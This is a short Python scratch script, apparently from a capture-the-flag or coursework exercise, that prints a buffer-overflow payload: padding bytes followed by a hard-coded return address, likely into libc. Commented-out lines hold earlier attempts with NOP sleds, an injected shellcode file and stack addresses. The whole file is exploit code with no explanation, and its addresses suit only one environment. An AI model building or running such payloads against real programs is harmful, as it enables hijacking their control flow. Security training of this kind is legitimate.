import sys


#sys.stdout.write('\x90' * (256+20-4-37-10))






#with open('inject1', 'r') as fin:
#    sys.stdout.write(fin.read())
#sys.stdout.write('A' * 8)
sys.stdout.write('A' * 8)
#sys.stdout.write('\xd0\x83\x04\x08') # address of *puts()
sys.stdout.write('\x70\x2e\xe6\xf7')



#sys.stdout.write('B' * 12)



#sys.stdout.write('\xb1\xd8\xff\xff')
#sys.stdout.write('C' * 8)
#sys.stdout.write('\x90\xd6\xff\xff')
#
#sys.stdout.write('\xb1\xd8\xff\xff')
#sys.stdout.write('D' * 28)
#sys.stdout.write('\xb1\xd8\xff\xff')
#
#sys.stdout.write('abcdefghijklmnopqrstuvw' * 2)
#sys.stdout.write('\x90' * 4)



#sys.stdout.write('\x58\xd5\xff\xff')
